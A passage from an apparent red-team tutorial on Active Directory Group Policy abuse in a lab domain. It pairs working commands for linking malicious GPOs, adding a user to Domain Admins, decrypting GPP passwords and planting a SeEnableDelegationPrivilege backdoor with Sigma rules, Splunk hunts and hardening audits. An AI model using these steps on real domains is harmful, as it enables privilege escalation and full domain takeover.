# that GPO has a malicious task — but it was only linked to a test OU

# Now link it to the high-value IT OU (hossam has gpLink write there)
PS C:\Users\hossam> Set-ADObject "OU=IT,DC=inlanefreight,DC=local" \
    -Add @{gpLink="[LDAP://CN={MALICIOUS-GPO-GUID},CN=Policies,CN=System,DC=inlanefreight,DC=local;0]"}
```

```bash
# From Linux — same approach via ldapmodify
# Append the malicious GPO link to the OU's existing gpLink
root@root$ ldapmodify -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' << 'EOF'
dn: OU=IT,DC=inlanefreight,DC=local
changetype: modify
add: gpLink
gpLink: [LDAP://CN={MALICIOUS-GPO-GUID},CN=Policies,CN=System,DC=inlanefreight,DC=local;0]
EOF
```

---

## Phase 8 — MultiTasking: DA Session → Domain Admin Escalation

> A Domain Admin has a session on a workstation in the GPO scope. We control a GPO linked to that workstation's OU.

```
MULTI-TASK ESCALATION FLOW
═══════════════════════════════════════════════════════════════════════

  Stage 1: Immediate task executes as NT AUTHORITY\SYSTEM
  → Uses SYSVOL as writable share (all domain users can read, DCs can write)
  → Drops a batch file to SYSVOL

  Stage 2: Registers a second scheduled task running as "highest privileges"
  → This task runs in the context of the DA session present on the machine

  Stage 3: Second task adds hossam to Domain Admins group
  → Runs: net group 'Domain Admins' hossam /add /domain
```

```powershell
# Using Invoke-GPOwned (PowerShell)
PS C:\Users\hossam> Import-Module .\Invoke-GPOwned.ps1
PS C:\Users\hossam> Invoke-GPOwned \
    -GPOName "IT-Workstations-Policy" \
    -LoadDLL ".\Microsoft.ActiveDirectory.Management.dll" \
    -User "hossam" \
    -DA \
    -ScheduledTasksXMLPath ".\ScheduledTasks.xml" \
    -SecondTaskXMLPath ".\wsadd.xml" \
    -Author "INLANEFREIGHT\eliot" \
    -SecondXMLCMD "/r net group 'Domain Admins' hossam /add /domain"
```

---

## Phase 9 — GPP Credentials (Bonus: Plaintext Passwords in GPOs)

Group Policy Preferences (GPP) allow setting local admin passwords via GPO. Until MS14-025, these were stored **AES-256 encrypted with a public key** — meaning anyone can decrypt them.

```bash
# Search SYSVOL for Groups.xml (GPP cpassword)
root@root$ smbclient //10.129.229.224/SYSVOL -U Hossam%'HossamR3dT3am!' \
    -c "ls inlanefreight.local\Policies\"

root@root$ find /tmp/sysvol -name "Groups.xml" 2>/dev/null

# Decrypt cpassword using gpp-decrypt (pre-installed on Kali)
root@root$ gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
Passw0rd!2024

# Or use metasploit
msf> use auxiliary/scanner/smb/smb_enum_gpp
msf> set RHOSTS 10.129.229.224
msf> set SMBUser hossam
msf> set SMBPass HossamR3dT3am!
msf> run
```

```powershell
# Windows — Get-GPPPassword (PowerView)
PS C:\Users\hossam> Get-GPPPassword

UserName  : localadmin
Password  : Passw0rd!2024
Changed   : 2024-03-01 14:22:18
GPOName   : Default Domain Policy
GPOPath   : \\inlanefreight.local\SYSVOL\...\{31B2F340-...}\Machine\Preferences\Groups\Groups.xml
```

---

## Phase 10 — GptTmpl.inf — SeEnableDelegationPrivilege Backdoor

This is a stealthy AD backdoor. By modifying the `GptTmpl.inf` file inside a DC-scoped GPO, an attacker grants `SeEnableDelegationPrivilege` to their account — giving complete domain control without direct Domain Admin membership.

```
SeEnableDelegationPrivilege BACKDOOR FLOW
═══════════════════════════════════════════════════════════════════════

  1. hossam has write on "Default Domain Controllers Policy"
  2. Adds SeEnableDelegationPrivilege → hossam in GptTmpl.inf
  3. After GP refresh on DCs, hossam can configure unconstrained delegation
  4. hossam sets unconstrained delegation on a machine he controls
  5. Coerces eliot (DA) to authenticate to that machine
  6. Captures eliot's TGT from LSASS memory
  7. Pass-the-Ticket as Domain Admin → complete domain takeover
```

```powershell
# SharpGPOAbuse — Add SeEnableDelegationPrivilege
PS C:\Users\hossam> .\SharpGPOAbuse.exe --AddUserRights \
    --UserRights "SeEnableDelegationPrivilege" \
    --UserAccount hossam \
    --GPOName "Default Domain Controllers Policy"

# Verify: the GptTmpl.inf will now contain under [Privilege Rights]:
# SeEnableDelegationPrivilege = *S-1-5-21-3456308105-...-1108
```

```bash
# From Linux: manually inject into GptTmpl.inf via smbclient
root@root$ smbclient //10.129.229.224/SYSVOL -U Hossam%'HossamR3dT3am!'

smb> get inlanefreight.local\Policies\{6AC1786C-...}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf /tmp/GptTmpl.inf

# Edit /tmp/GptTmpl.inf — find [Privilege Rights] section and add:
# SeEnableDelegationPrivilege = *S-1-5-21-3456308105-2521031762-2678499478-1108

smb> put /tmp/GptTmpl.inf inlanefreight.local\Policies\{6AC1786C-...}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf

# Increment the GPO version number to force refresh
root@root$ ldapmodify -H ldap://10.129.229.224 \
    -x -D 'hossam@inlanefreight.local' \
    -w 'HossamR3dT3am!' << 'EOF'
dn: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=inlanefreight,DC=local
changetype: modify
replace: versionNumber
versionNumber: 4
EOF
```

---

## Summary of All Attack Vectors

```
┌─────────────────────────────────────────────────────────────────────────┐
│                  GPO ABUSE — COMPLETE ATTACK MATRIX                     │
├─────────────────┬─────────────────┬──────────────┬───────────────────── ┤
│  ATTACK         │  REQUIRED RIGHT │  LINUX TOOL  │  WINDOWS TOOL        │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ Edit GPO →      │ GenericWrite    │ pyGPOAbuse   │ SharpGPOAbuse        │
│ Immediate task  │ on GPO          │ GPOddity     │ New-GPOImmediateTask  │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ Edit GPO →      │ GenericWrite    │ smbclient    │ SharpGPOAbuse        │
│ Startup script  │ on GPO          │ pyGPOAbuse   │ Set-GPPrefRegistry   │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ Edit GPO →      │ GenericWrite    │ smbclient    │ SharpGPOAbuse        │
│ Add local admin │ on GPO          │ pyGPOAbuse   │ (--AddLocalAdmin)    │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ Edit GPO →      │ GenericWrite    │ smbclient    │ SharpGPOAbuse        │
│ User rights     │ on GPO          │ manually     │ (--AddUserRights)    │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ Create new GPO  │ Creator Owners  │ bloodyAD     │ New-GPO              │
│ + link to OU    │ + gpLink write  │ ldapmodify   │ New-GPLink           │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ WriteDACL →     │ WriteDACL       │ dacledit     │ Add-DomainObjectAcl  │
│ self-grant →    │ on GPO          │ ldapmodify   │ (PowerView)          │
│ then edit       │                 │              │                      │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ NTLM Relay →    │ Relayable auth  │ GPOddity     │ (GPOddity)           │
│ GPO takeover    │ + LDAP no-sign  │ ntlmrelayx   │                      │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ GPP Creds       │ Authenticated   │ gpp-decrypt  │ Get-GPPPassword      │
│                 │ user only       │ smbclient    │ (PowerView)          │
├─────────────────┼─────────────────┼──────────────┼──────────────────────┤
│ SeEnable        │ GenericWrite    │ smbclient    │ SharpGPOAbuse        │
│ Delegation      │ on DC Policy    │ GptTmpl.inf  │ (--AddUserRights)    │
│ Backdoor        │                 │              │                      │
└─────────────────┴─────────────────┴──────────────┴──────────────────────┘
```

---

## Detection

### Key Windows Event IDs

| Event ID | Log | What it Captures |
|---|---|---|
| **5136** | Directory Service | AD attribute modified — fires on GPC changes (gPCFileSysPath, versionNumber, gpLink) |
| **5137** | Directory Service | New AD object created — fires when a new GPO is created |
| **5141** | Directory Service | AD object deleted — fires when a GPO is deleted |
| **4662** | Security | AD object operation performed (generic) |
| **4670** | Security | Permissions changed on an AD object — fires on DACL changes to GPOs |
| **5145** | Security | Network share access — SYSVOL/Policies directory writes |
| **4688** | Security | Process creation — look for `cmd.exe` / `powershell.exe` spawned by `taskeng.exe` or `svchost.exe` |
| **106/200** | Task Scheduler | Scheduled task registered / executed |
| **4698/4702** | Security | Scheduled task created / updated |

### Sigma Rules

#### Detect New GPO Created (Event ID 5137)

```yaml
title: New Group Policy Object Created
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: stable
description: Detects creation of a new Group Policy Object in Active Directory
references:
  - https://attack.mitre.org/techniques/T1484/001/
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5137
    ObjectClass: 'groupPolicyContainer'
  condition: selection
falsepositives:
  - Legitimate administrator GPO creation
level: medium
tags:
  - attack.defense_evasion
  - attack.privilege_escalation
  - attack.t1484.001
```

#### Detect GPO Attribute Modified (Event ID 5136)

```yaml
title: Group Policy Object Attribute Modified
id: b2c3d4e5-f6a7-8901-bcde-f01234567891
status: stable
description: Detects modification of key GPO attributes in Active Directory
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    ObjectClass: 'groupPolicyContainer'
    AttributeLDAPDisplayName|contains:
      - 'gPCFileSysPath'
      - 'gPCMachineExtensionNames'
      - 'gPCUserExtensionNames'
      - 'versionNumber'
  condition: selection
falsepositives:
  - Legitimate GPO management by administrators
level: high
tags:
  - attack.t1484.001
```

#### Detect Immediate Scheduled Task via GPO

```yaml
title: Scheduled Task Created via Group Policy (SYSVOL)
id: c3d4e5f6-a7b8-9012-cdef-012345678912
status: experimental
description: Detects a new ScheduledTasks.xml being written to a GPO folder in SYSVOL
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName: 'SYSVOL'
    RelativeTargetName|endswith:
      - '\ScheduledTasks.xml'
      - '\GptTmpl.inf'
    AccessMask: '0x2'  # WriteData
  condition: selection
falsepositives:
  - Legitimate admin modifications to GPO files
level: high
tags:
  - attack.persistence
  - attack.t1053.005
```

#### Detect gpLink Modification (GPO Linked to New OU)

```yaml
title: GPO Linked to Organizational Unit
id: d4e5f6a7-b8c9-0123-defa-123456789013
status: stable
description: Detects modification of the gpLink attribute on an OU — a GPO has been linked
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'gPLink'
    OperationType: 'Value Added'
  condition: selection
falsepositives:
  - Legitimate GPO management
level: medium
tags:
  - attack.t1484.001
```

### Splunk Detection Queries

#### Hunt for New GPOs Created

```splunk
index=dc_security EventCode=5137 ObjectClass="groupPolicyContainer"
| stats count by SubjectUserName, ObjectDN, _time
| sort -_time
| where SubjectUserName NOT IN ("Administrator", "SYSTEM")
```

#### Hunt for GPO Attribute Changes Outside Maintenance Windows

```splunk
index=dc_security EventCode=5136 ObjectClass="groupPolicyContainer"
| eval hour=strftime(_time, "%H") | eval day=strftime(_time, "%A")
| where (hour < "08" OR hour > "18") OR (day="Saturday" OR day="Sunday")
| stats count by SubjectUserName, AttributeLDAPDisplayName, ObjectDN, _time
| sort -_time
```

#### Correlate SYSVOL ScheduledTasks.xml Writes with Task Execution

```splunk
index=dc_security (EventCode=5145 ShareName="SYSVOL" RelativeTargetName="*ScheduledTasks.xml*")
| join type=inner ComputerName
    [search index=windows EventCode=4698 OR EventCode=106]
| table _time, SubjectUserName, ComputerName, RelativeTargetName, TaskName
| sort -_time
```

#### Detect SeEnableDelegationPrivilege Assignment via GPO

```splunk
index=dc_security EventCode=5136
| where AttributeValue LIKE "%SeEnableDelegationPrivilege%"
| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
```

---

## Hardening & Mitigation

| Control | Implementation |
|---|---|
| **Audit GPO permissions regularly** | Use BloodHound to find non-admin accounts with GPO write rights |
| **Restrict Group Policy Creator Owners** | Remove all non-admin users; only Domain Admins should create GPOs |
| **Enable SYSVOL write auditing** | Configure SACL on `%systemroot%\SYSVOL\sysvol\` for write/modify operations |
| **Enable Directory Service Changes audit** | Required for Event IDs 5136/5137/5141 — enable in Advanced Audit Policy |
| **Enforce LDAP signing** | Prevents GPOddity-style NTLM relay to LDAP (`RequireLDAPSigning`) |
| **Enable LDAP channel binding** | Additional protection against NTLM relay (`LdapEnforceChannelBinding`) |
| **Enable SMB signing** | Prevents NTLM relay via SMB to SYSVOL |
| **Enforce UNC path hardening** | `RequireMutualAuthentication=1` for SYSVOL and NETLOGON shares |
| **Remove GPP password entries** | Eliminate `cpassword` from Groups.xml (MS14-025 patch required) |
| **Segment GPO scope with WMI filters** | Limit blast radius of compromised GPOs using WMI filtering |
| **Use Purple Knight / Group3r** | Continuously audit GPO for misconfigurations |
| **Monitor SeEnableDelegationPrivilege** | Alert on any GptTmpl.inf changes granting this privilege (Event 4670) |

### PowerShell Audit: Find All Non-Admin GPO Write Rights

```powershell
Import-Module ActiveDirectory
Import-Module GroupPolicy

$privilegedGroups = @(
    "Domain Admins", "Enterprise Admins", "Group Policy Creator Owners",
    "Administrators", "SYSTEM"
)

Get-GPO -All | ForEach-Object {
    $gpo = $_
    $acl = Get-GPPermissions -Guid $gpo.Id -All
    foreach ($perm in $acl) {
        if ($perm.Permission -in @("GpoEdit","GpoEditDeleteModifySecurity","GpoCustom") -and
            $perm.Trustee.Name -notin $privilegedGroups) {
            [PSCustomObject]@{
                GPOName    = $gpo.DisplayName
                GUID       = $gpo.Id
                Trustee    = $perm.Trustee.Name
                Permission = $perm.Permission
                Type       = $perm.Trustee.SidType
            }
        }
    }
} | Export-Csv "C:\Audit\GPO_NonAdmin_Rights.csv" -NoTypeInformation
```

### PowerShell Audit: Find GPOs with Overly Broad Scope (All Computers in Domain)

```powershell
# GPOs linked to the domain root affect ALL computers
Get-GPInheritance -Target (Get-ADDomain).DistinguishedName |
    Select-Object -ExpandProperty GpoLinks |
    ForEach-Object {
        [PSCustomObject]@{
            GPOName   = $_.DisplayName
            Enabled   = $_.Enabled
            Enforced  = $_.Enforced
            Order     = $_.Order
        }
    } | Format-Table -AutoSize
```

---

## Quick Reference

```
┌────────────────────────────────────────────────────────────────────────┐
│                   GPO ABUSE — RED TEAM QUICK REFERENCE                 │
├──────────────────────┬─────────────────────────────────────────────────┤
│  Enumerate GPOs      │  Get-DomainGPO, ldapsearch, BloodHound          │
│  Find write rights   │  Get-DomainObjectAcl, dacledit, BH Cypher       │
│  Find link rights    │  Get-DomainOU + gpLink ACL, BH Cypher           │
├──────────────────────┼─────────────────────────────────────────────────┤
│  Edit GPO (Win)      │  SharpGPOAbuse, New-GPOImmediateTask (Empire)   │
│  Edit GPO (Linux)    │  pyGPOAbuse, GPOddity, smbclient + manual       │
│  Create GPO (Win)    │  New-GPO + New-GPLink + SharpGPOAbuse           │
│  Create GPO (Linux)  │  bloodyAD + ldapmodify + pyGPOAbuse             │
│  Link GPO (Win)      │  New-GPLink, Set-ADObject                       │
│  Link GPO (Linux)    │  ldapmodify (gpLink attribute)                  │
│  Escalate via NTLM   │  GPOddity + ntlmrelayx                          │
│  GPP Creds           │  gpp-decrypt, Get-GPPPassword                   │
│  SeDelegPriv Backdoor│  SharpGPOAbuse --AddUserRights + GptTmpl.inf    │
├──────────────────────┼─────────────────────────────────────────────────┤
│  MITRE               │  T1484.001 (Group Policy Modification)          │
│  Detection           │  Event IDs: 5136, 5137, 5145, 4698, 4662, 4670  │
│  Mitigation          │  Audit ACLs, restrict Creator Owners, LDAP sign │
└──────────────────────┴─────────────────────────────────────────────────┘
```

---

## References

- [MITRE ATT&CK T1484.001 — Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/)
- [SharpGPOAbuse — FSecureLABS](https://github.com/FSecureLABS/SharpGPOAbuse)
- [pyGPOAbuse — Hackndo](https://github.com/Hackndo/pyGPOAbuse)
- [GPOddity — Synacktiv](https://github.com/synacktiv/GPOddity)
- [GPOddity Research Paper — Synacktiv](https://synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [Group3r — Group3r/Group3r](https://github.com/Group3r/Group3r)
- [The Hacker Recipes — Group Policies](https://www.thehacker.recipes/ad/movement/group-policies)
- [Abusing GPO Permissions — harmj0y](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [Sneaky AD Persistence #17: Group Policy — ADSecurity](https://adsecurity.org/?p=2716)
- [GPO Abuse Explained — Semperis](https://www.semperis.com/blog/group-policy-abuse-explained/)
- [Understanding GPO Abuse — Rushabh Bhutak](https://infosecwriteups.com/group-policy-abuse-modify-existing-gpo-066ae2d17fdd)
- [Group Policy Abuse for Privilege Addition — Elastic](https://detection.fyi/elastic/detection-rules/windows/privilege_escalation_group_policy_privileged_groups/)
- [bloodyAD — CravateRouge](https://github.com/CravateRouge/bloodyAD)
- [PPN GPO Abuse Cheatsheet — snovvcrash](https://github.com/snovvcrash/PPN/blob/master/pentest/infrastructure/ad/gpo-abuse.md)
- [PowerView — PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [SeEnableDelegationPrivilege Detection — Elastic](https://www.elastic.co/guide/en/security/8.19/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html)
